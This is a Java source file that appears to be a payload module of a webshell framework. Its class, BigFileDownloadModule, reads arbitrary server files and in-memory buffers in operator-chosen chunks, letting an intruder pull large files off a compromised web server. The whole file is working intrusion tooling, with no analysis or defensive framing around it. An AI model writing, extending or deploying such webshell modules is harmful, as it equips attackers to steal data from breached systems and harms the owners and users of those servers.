package shells.payloads.java.modules;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.util.Map;

public class BigFileDownloadModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }

    private Map getSessionTable() {
        if (this.session == null) {
            return null;
        }
        Object value = this.session.get("sessionTable");
        return value instanceof Map ? (Map) value : null;
    }

    private long getMemSize(Map table, String memKey) {
        Object sizeValue = table.get(memKey + ":size");
        if (sizeValue instanceof Number) {
            return ((Number) sizeValue).longValue();
        } else if (sizeValue instanceof String) {
            try {
                return Long.parseLong((String) sizeValue);
            } catch (Exception ignored) {
                return 0L;
            }
        } else if (sizeValue instanceof byte[]) {
            try {
                return Long.parseLong(new String((byte[]) sizeValue));
            } catch (Exception ignored) {
                return 0L;
            }
        } else {
            Object data = table.get(memKey);
            if (data instanceof ByteArrayOutputStream) {
                return (long) ((ByteArrayOutputStream) data).size();
            }
            return data instanceof byte[] ? (long) ((byte[]) data).length : 0L;
        }
    }

    private static byte[] getBaosBuf(ByteArrayOutputStream baos) throws Exception {
        Field f = ByteArrayOutputStream.class.getDeclaredField("buf");
        f.setAccessible(true);
        return (byte[]) f.get(baos);
    }

    private static int getBaosCount(ByteArrayOutputStream baos) throws Exception {
        Field f = ByteArrayOutputStream.class.getDeclaredField("count");
        f.setAccessible(true);
        return ((Integer) f.get(baos)).intValue();
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String fileName = getString("fileName");
            String positionString = getString("position");
            String readByteNumString = getString("readByteNum");
            String mode = getString("mode");
            
            if (fileName != null) {
                if (fileName.startsWith("mem://")) {
                    Map sessionTable = this.getSessionTable();
                    if (sessionTable == null) {
                        sessionTable = this.session;
                    }

                    String memKey = fileName;
                    String legacyMemKey = "MEMFS:" + fileName;
                    Object dataObj = sessionTable.get(memKey);
                    if (!(dataObj instanceof byte[]) && !(dataObj instanceof ByteArrayOutputStream)) {
                        dataObj = sessionTable.get(legacyMemKey);
                    }
                    byte[] data = dataObj instanceof byte[] ? (byte[]) dataObj : null;
                    ByteArrayOutputStream baos = dataObj instanceof ByteArrayOutputStream ? (ByteArrayOutputStream) dataObj : null;
                    long size = this.getMemSize(sessionTable, (data != null || baos != null) ? memKey : legacyMemKey);

                    if (mode != null && mode.equals("fileSize")) {
                        return data == null && baos == null ? "-1".getBytes() : String.valueOf(size).getBytes();
                    }

                    if (positionString != null && readByteNumString != null && (data != null || baos != null)) {
                        long position = Long.parseLong(positionString);
                        int readByteNum = Integer.parseInt(readByteNumString);
                        int positionInt = (int) position;
                        if ((long) positionInt != position) {
                            return new byte[0];
                        }

                        if (position >= size) {
                            return new byte[0];
                        }

                        int maxReadable = (int) Math.min((long) Integer.MAX_VALUE, size);
                        int remaining = maxReadable - positionInt;
                        if (remaining <= 0) {
                            return new byte[0];
                        }

                        int n = Math.min(readByteNum, remaining);
                        byte[] out = new byte[n];
                        if (data != null) {
                            System.arraycopy(data, positionInt, out, 0, n);
                        } else {
                            try {
                                byte[] buf = getBaosBuf(baos);
                                int count = getBaosCount(baos);
                                if (positionInt >= count) {
                                    return new byte[0];
                                }
                                int max = count - positionInt;
                                if (n > max) {
                                    n = max;
                                    out = new byte[n];
                                }
                                System.arraycopy(buf, positionInt, out, 0, n);
                            } catch (Exception e) {
                                byte[] all = baos.toByteArray();
                                int max = all.length - positionInt;
                                if (n > max) {
                                    n = max;
                                    out = new byte[n];
                                }
                                System.arraycopy(all, positionInt, out, 0, n);
                            }
                        }
                        return out;
                    }

                    return "Missing parameters".getBytes();
                }

                File file = new File(fileName);
                
                if (mode != null && mode.equals("fileSize")) {
                    if (file.exists()) {
                        return String.valueOf(file.length()).getBytes();
                    } else {
                        return "-1".getBytes();
                    }
                }
                
                if (positionString != null && readByteNumString != null && file.exists()) {
                    long position = Long.parseLong(positionString);
                    int readByteNum = Integer.parseInt(readByteNumString);
                    // JDK 1.6: no try-with-resources.
                    RandomAccessFile raf = null;
                    try {
                        raf = new RandomAccessFile(file, "r");
                        if (position > raf.length()) {
                            return new byte[0];
                        }

                        raf.seek(position);
                        byte[] buffer = new byte[readByteNum];
                        int bytesRead = raf.read(buffer);

                        if (bytesRead < readByteNum) {
                            byte[] result = new byte[bytesRead];
                            System.arraycopy(buffer, 0, result, 0, bytesRead);
                            return result;
                        }

                        return buffer;
                    } finally {
                        if (raf != null) { try { raf.close(); } catch (Exception ignored) {} }
                    }
                }
            }
            return "Missing parameters".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "bigFileDownload";
    }
}
